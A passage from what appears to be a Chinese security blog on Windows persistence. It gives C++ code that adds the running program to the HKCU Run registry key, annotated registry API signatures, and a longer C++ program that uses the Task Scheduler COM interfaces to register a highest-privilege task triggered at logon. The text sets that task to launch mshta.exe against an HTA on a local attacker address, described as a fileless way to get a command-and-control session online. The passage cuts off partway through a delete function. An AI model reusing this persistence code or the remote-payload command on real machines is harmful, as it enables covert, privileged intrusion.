title="修改注册表"></a>修改注册表</h1><p>无需管理员权限即可修改HKEY_CURRENT_USER</p><p>在HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run中写入程序路径即可实现开机自启动</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//添加自身到注册表启动项</span><br><span class="hljs-function">BOOL <span class="hljs-title">Regpersist</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HKEY hKey;<br>LPCTSTR szRun = _T(<span class="hljs-string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>);<br><span class="hljs-keyword">if</span> (RegOpenKeyEx(HKEY_CURRENT_USER, szRun, <span class="hljs-number">0</span>, KEY_ALL_ACCESS, &amp;hKey)<br>== ERROR_SUCCESS)<br>&#123;<br>TCHAR szFileName[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>DWORD dwRet = GetModuleFileName(<span class="hljs-literal">NULL</span>, szFileName, MAX_PATH);<br>AfxMessageBox(szFileName);<br><span class="hljs-keyword">long</span> lRet = RegSetValueEx(hKey, _T(<span class="hljs-string">&quot;Login&quot;</span>), <span class="hljs-number">0</span>, REG_SZ, (BYTE*)szFileName, dwRet);<br>RegCloseKey(hKey);<br><span class="hljs-keyword">if</span> (lRet != ERROR_SUCCESS)<br><span class="hljs-keyword">return</span> FALSE;<br><span class="hljs-comment">//else// 删除启动;</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//long lRet = RegDeleteValue(hKey, &quot;MFCLogin&quot;);</span><br><span class="hljs-comment">//RegCloseKey(hKey);</span><br><span class="hljs-comment">//if (lRet != ERROR_SUCCESS)</span><br><span class="hljs-comment">//return FALSE;</span><br><span class="hljs-comment">//&#125;</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>MessageBox(_T(<span class="hljs-string">&quot;打开注册表失败&quot;</span>));<br>        <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>MessageBox(_T(<span class="hljs-string">&quot;添加成功&quot;</span>));<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h1><h2 id="SHGetSpecialFolderPath"><a href="#SHGetSpecialFolderPath" class="headerlink" title="SHGetSpecialFolderPath"></a>SHGetSpecialFolderPath</h2><p>该api用来获取指定的系统路径 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">SHGetSpecialFolderPathA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HWND  hwnd,</span></span><br><span class="hljs-function"><span class="hljs-params">  LPSTR pszPath,</span></span><br><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">int</span>   csidl, <span class="hljs-comment">//CSIDL_STARTUP</span></span></span><br><span class="hljs-function"><span class="hljs-params">  BOOL  fCreate</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="RegOpenKey"><a href="#RegOpenKey" class="headerlink" title="RegOpenKey"></a>RegOpenKey</h2><p>打开注册表，成功返回ERROR_SUCCESS</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LSTATUS <span class="hljs-title">RegOpenKeyA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HKEY   hKey,   <span class="hljs-comment">//指定一个父键句柄  HKEY_CURRENT_USER </span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPCSTR lpSubKey,<span class="hljs-comment">//指向一个字符串，表示要打开的子键名称,_T(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;)</span></span></span><br><span class="hljs-function"><span class="hljs-params">  PHKEY  phkResult<span class="hljs-comment">//返回打开的子键句柄 &amp;hKey</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="RegCloseKey"><a href="#RegCloseKey" class="headerlink" title="RegCloseKey"></a>RegCloseKey</h2><p>关闭注册表，成功返回ERROR_SUCCESS</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LSTATUS <span class="hljs-title">RegCloseKey</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HKEY hKey<span class="hljs-comment">//打开的子键句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="RegQueryValueEx"><a href="#RegQueryValueEx" class="headerlink" title="RegQueryValueEx"></a>RegQueryValueEx</h2><p>注册表键值的查询</p><p>成功返回  ERROR_SUCCESS.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LSTATUS <span class="hljs-title">RegQueryValueExA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HKEY    hKey,<span class="hljs-comment">//指向一个已经被打开或创建的子键句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPCSTR  lpValueName,<span class="hljs-comment">//指定要被查询的键值的名称</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPDWORD lpReserved,<span class="hljs-comment">//保留，始终NULL</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPDWORD lpType,<span class="hljs-comment">//返回被查询的值的类型</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPBYTE  lpData,<span class="hljs-comment">//返回被查询数据的缓冲区</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPDWORD lpcbData<span class="hljs-comment">//缓冲区长度</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="RegSetValueEx"><a href="#RegSetValueEx" class="headerlink" title="RegSetValueEx"></a>RegSetValueEx</h2><p>注册表键值的写入</p><p>成功返回  ERROR_SUCCESS.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LSTATUS <span class="hljs-title">RegSetValueExA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HKEY       hKey,<span class="hljs-comment">//指向一个已经被打开或创建的子键句柄 HKEY_LOCAL</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPCSTR     lpValueName,<span class="hljs-comment">//指定要被查询或写入的键值的名称 MFCLogin</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD      Reserved,<span class="hljs-comment">//保留，始终为0   0</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD      dwType,<span class="hljs-comment">//写入键值的类型   REG_SZ</span></span></span><br><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">const</span> BYTE *lpData,<span class="hljs-comment">//写入键值的缓冲区   路径</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD      cbData<span class="hljs-comment">//写入键值缓冲区的长度    sizeof</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="RegEnumValue"><a href="#RegEnumValue" class="headerlink" title="RegEnumValue"></a>RegEnumValue</h2><p>注册表键值的枚举</p><p>成功返回  ERROR_SUCCESS.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LSTATUS <span class="hljs-title">RegEnumValueA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HKEY    hKey,<span class="hljs-comment">//指向一个已经被打开或创建的子键句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD   dwIndex,<span class="hljs-comment">//查询的索引值</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPSTR   lpValueName,<span class="hljs-comment">//健名的缓冲区</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPDWORD lpcchValueName,<span class="hljs-comment">//健名缓冲区的长度</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPDWORD lpReserved,<span class="hljs-comment">//保留，NULL</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPDWORD lpType,<span class="hljs-comment">//返回被查询的值的类型</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPBYTE  lpData,<span class="hljs-comment">//被查询键值的缓冲区</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPDWORD lpcbData<span class="hljs-comment">//被查询键值的缓冲区的大小</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="RegDeleteValue"><a href="#RegDeleteValue" class="headerlink" title="RegDeleteValue"></a>RegDeleteValue</h2><p>注册表键值的删除</p><p>成功返回  ERROR_SUCCESS.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LSTATUS <span class="hljs-title">RegDeleteValueA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HKEY   hKey,<span class="hljs-comment">//指向一个已经被打开或创建的子键句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPCSTR lpValueName<span class="hljs-comment">//指向欲删除的键值项的名称</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="GetModuleFileName"><a href="#GetModuleFileName" class="headerlink" title="GetModuleFileName"></a>GetModuleFileName</h2><p>在开发过程中经常需要获得程序当前的运行目录，这时就可以使用GetModuleFileName</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">GetModuleFileName</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HMODULE hModule,<span class="hljs-comment">//要获取文件名的模块名柄,null表示当前模块</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPTSTR lpFileName,<span class="hljs-comment">//输出参数，存放取得的文件名 TCHAR lpfilename</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD nSize<span class="hljs-comment">//参数的长度     MAX_PATH</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用COM组件创建计划任务</title>
    <link href="/2021/02/28/%E4%BD%BF%E7%94%A8COM%E7%BB%84%E4%BB%B6%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"/>
    <url>/2021/02/28/%E4%BD%BF%E7%94%A8COM%E7%BB%84%E4%BB%B6%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>Windows系统可以设置计划任务来指向一些定时任务。本书中计划任务的触发条件是在用户登陆时触发，执行启动指定路径程序的操作</p><p>创建计划任务时涉及到COM组件接口的调用，要求管理员权限，程序逻辑概括为三个部分，分别是初始化操作、创建计划任务操作、删除计划任务操作。</p><h2 id="1-初始化操作"><a href="#1-初始化操作" class="headerlink" title="1.初始化操作"></a>1.初始化操作</h2><p>由于使用COM组件，所以必须调用CoInitialize函数来初始化COM接口环境，这样才能使用COM接口函数。同时也要先获取ITaskService对象指针以及ITaskFolder指针，这两个指针对象主要用来进行计划任务的创建操作。</p><p>1.CoInitialize初始化COM组件</p><p>2.CoCreateInstance创建任务服务对象</p><p>3.连接到任务服务</p><p>4.从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向新注册的任务</p><p>初始化操作完成后直接操作ITaskService对象以及ITaskFolder对象</p><h2 id="2-创建计划任务"><a href="#2-创建计划任务" class="headerlink" title="2.创建计划任务"></a>2.创建计划任务</h2><p>从ITaskService对象中创建一个任务定义对象ITaskDefinition，它被用于创建任务，然后对任务定义对象ITaskDefinition进行设置</p><p>设置注册信息，包括设置作者信息。</p><p>设置主体信息，包括登陆类型、运行权限。</p><p>设置配置信息，包括使用电池运行时是否停止</p><p>设置操作信息，包括要启动的程序，并设置程序路径和参数</p><p>设置触发器，在用户登陆时执行计划任务</p><h2 id="3-删除计划任务"><a href="#3-删除计划任务" class="headerlink" title="3.删除计划任务"></a>3.删除计划任务</h2><p>调用DeleteTask接口函数删除指定名称的计划任务</p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>这里使用mshta上线，无文件上线的方法很多，不局限这一种</p><p>将计划任务设置为执行c:\windows\system32\mshta.exe <a href="http://192.168.111.129:8080/p7ptgsev.hta">http://192.168.111.129:8080/p7ptgsev.hta</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atlbase.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;comdef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;shlobj_core.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;taskschd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;taskschd.lib&quot;</span>)</span><br><br>ITaskService* m_lpITS = <span class="hljs-literal">NULL</span>;<br>ITaskFolder* m_lpRootFolder = <span class="hljs-literal">NULL</span>;<br><br><br><span class="hljs-comment">//初始化COM组件</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Init</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-comment">//1.CoInitialize初始化COM组件</span><br>HRESULT hr = CoInitialize(<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (FAILED(hr)) &#123;<br>MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;初始化COM组件失败&quot;</span>, <span class="hljs-string">L&quot;Failed&quot;</span>, MB_OK);<br>&#125;<br><br><span class="hljs-comment">//2.CoCreateInstance创建任务服务对象</span><br>hr = CoCreateInstance(CLSID_TaskScheduler, <span class="hljs-literal">NULL</span>, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID*)&amp;m_lpITS);<br><span class="hljs-keyword">if</span> (FAILED(hr)) &#123;<br>MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;创建任务服务失败&quot;</span>, <span class="hljs-string">L&quot;Failed&quot;</span>, MB_OK);<br>&#125;<br><span class="hljs-comment">//3.连接到任务服务</span><br>hr = m_lpITS-&gt;Connect(<span class="hljs-keyword">_variant_t</span>(), <span class="hljs-keyword">_variant_t</span>(), <span class="hljs-keyword">_variant_t</span>(), <span class="hljs-keyword">_variant_t</span>());<br><span class="hljs-keyword">if</span> (FAILED(hr)) &#123;<br>MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;连接服务失败&quot;</span>, <span class="hljs-string">L&quot;Failed&quot;</span>, MB_OK);<br>&#125;<br><span class="hljs-comment">//4.从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向新注册的任务</span><br>hr = m_lpITS-&gt;GetFolder(<span class="hljs-keyword">_bstr_t</span>(<span class="hljs-string">&quot;\\&quot;</span>), &amp;m_lpRootFolder);<br><span class="hljs-keyword">if</span> (FAILED(hr)) &#123;<br>MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;获取指针失败&quot;</span>, <span class="hljs-string">L&quot;Failed&quot;</span>, MB_OK);<br><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//卸载COM组件</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">UnInit</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span> (m_lpITS)<br>&#123;<br>m_lpITS-&gt;Release();<br>&#125;<br><span class="hljs-keyword">if</span> (m_lpRootFolder)<br>&#123;<br>m_lpRootFolder-&gt;Release();<br>&#125;<br>::CoUninitialize();<br>&#125;<br><br><span class="hljs-comment">//创建计划任务</span><br><span class="hljs-function">BOOL <span class="hljs-title">CreateTask</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* lpszTaskName,<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* lpszProgramPath,<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* lpszParameters,<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* lpszAuthor)</span> </span>&#123;<br><span class="hljs-comment">// 创建任务定义对象来创建任务</span><br>ITaskDefinition* pTaskDefinition = <span class="hljs-literal">NULL</span>;<br>HRESULT hr = m_lpITS-&gt;NewTask(<span class="hljs-number">0</span>, &amp;pTaskDefinition);<br><span class="hljs-keyword">if</span> (FAILED(hr))<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">/* 设置注册信息 */</span><br>IRegistrationInfo* pRegInfo = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function">CComVariant <span class="hljs-title">variantAuthor</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;<br>variantAuthor = lpszAuthor;<br>hr = pTaskDefinition-&gt;get_RegistrationInfo(&amp;pRegInfo);<br><span class="hljs-keyword">if</span> (FAILED(hr))<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 设置作者信息</span><br>hr = pRegInfo-&gt;put_Author(variantAuthor.bstrVal);<br>pRegInfo-&gt;Release();<br><br><span class="hljs-comment">/* 设置登录类型和运行权限 */</span><br>IPrincipal* pPrincipal = <span class="hljs-literal">NULL</span>;<br>hr = pTaskDefinition-&gt;get_Principal(&amp;pPrincipal);<br><span class="hljs-keyword">if</span> (FAILED(hr))<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 设置登录类型</span><br>hr = pPrincipal-&gt;put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);<br><span class="hljs-comment">// 设置运行权限</span><br><span class="hljs-comment">// 最高权限</span><br>hr = pPrincipal-&gt;put_RunLevel(TASK_RUNLEVEL_HIGHEST);<br>pPrincipal-&gt;Release();<br><br><span class="hljs-comment">/* 设置其他信息 */</span><br>ITaskSettings* pSettting = <span class="hljs-literal">NULL</span>;<br>hr = pTaskDefinition-&gt;get_Settings(&amp;pSettting);<br><span class="hljs-keyword">if</span> (FAILED(hr))<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 设置其他信息</span><br>hr = pSettting-&gt;put_StopIfGoingOnBatteries(VARIANT_FALSE);<br>hr = pSettting-&gt;put_DisallowStartIfOnBatteries(VARIANT_FALSE);<br>hr = pSettting-&gt;put_AllowDemandStart(VARIANT_TRUE);<br>hr = pSettting-&gt;put_StartWhenAvailable(VARIANT_FALSE);<br>hr = pSettting-&gt;put_MultipleInstances(TASK_INSTANCES_PARALLEL);<br>pSettting-&gt;Release();<br><br><span class="hljs-comment">/* 创建执行动作 */</span><br>IActionCollection* pActionCollect = <span class="hljs-literal">NULL</span>;<br>hr = pTaskDefinition-&gt;get_Actions(&amp;pActionCollect);<br><span class="hljs-keyword">if</span> (FAILED(hr))<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>IAction* pAction = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">// 创建执行操作</span><br>hr = pActionCollect-&gt;Create(TASK_ACTION_EXEC, &amp;pAction);<br>pActionCollect-&gt;Release();<br><br><span class="hljs-comment">/* 设置执行程序路径和参数 */</span><br><span class="hljs-function">CComVariant <span class="hljs-title">variantProgramPath</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;<br><span class="hljs-function">CComVariant <span class="hljs-title">variantParameters</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;<br>IExecAction* pExecAction = <span class="hljs-literal">NULL</span>;<br>hr = pAction-&gt;QueryInterface(IID_IExecAction, (PVOID*)(&amp;pExecAction));<br><span class="hljs-keyword">if</span> (FAILED(hr))<br>&#123;<br>pAction-&gt;Release();<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>pAction-&gt;Release();<br><span class="hljs-comment">// 设置程序路径和参数</span><br>variantProgramPath = lpszProgramPath;<br>variantParameters = lpszParameters;<br>pExecAction-&gt;put_Path(variantProgramPath.bstrVal);<br>pExecAction-&gt;put_Arguments(variantParameters.bstrVal);<br>pExecAction-&gt;Release();<br><br><span class="hljs-comment">/* 创建触发器，实现用户登陆自启动 */</span><br>ITriggerCollection* pTriggers = <span class="hljs-literal">NULL</span>;<br>hr = pTaskDefinition-&gt;get_Triggers(&amp;pTriggers);<br><span class="hljs-keyword">if</span> (FAILED(hr))<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 创建触发器,把触发器设置为</span><br>ITrigger* pTrigger = <span class="hljs-literal">NULL</span>;<br>hr = pTriggers-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger);<br><span class="hljs-keyword">if</span> (FAILED(hr))<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">/* 注册任务计划  */</span><br>IRegisteredTask* pRegisteredTask = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function">CComVariant <span class="hljs-title">variantTaskName</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;<br>variantTaskName = lpszTaskName;<br>hr = m_lpRootFolder-&gt;RegisterTaskDefinition(variantTaskName.bstrVal,<br>pTaskDefinition,<br>TASK_CREATE_OR_UPDATE,<br><span class="hljs-keyword">_variant_t</span>(),<br><span class="hljs-keyword">_variant_t</span>(),<br>TASK_LOGON_INTERACTIVE_TOKEN,<br><span class="hljs-keyword">_variant_t</span>(<span class="hljs-string">&quot;&quot;</span>),<br>&amp;pRegisteredTask);<br><span class="hljs-keyword">if</span> (FAILED(hr))<br>&#123;<br>pTaskDefinition-&gt;Release();<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>pTaskDefinition-&gt;Release();<br>pRegisteredTask-&gt;Release();<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br><span class="hljs-comment">//删除计划任务</span><br><span class="hljs-function">BOOL <span class="hljs-title">DeleteTask</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszTaskName)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == m_lpRootFolder)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-function">CComVariant <span class="hljs-title">variantTaskName</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;<br>variantTaskName = 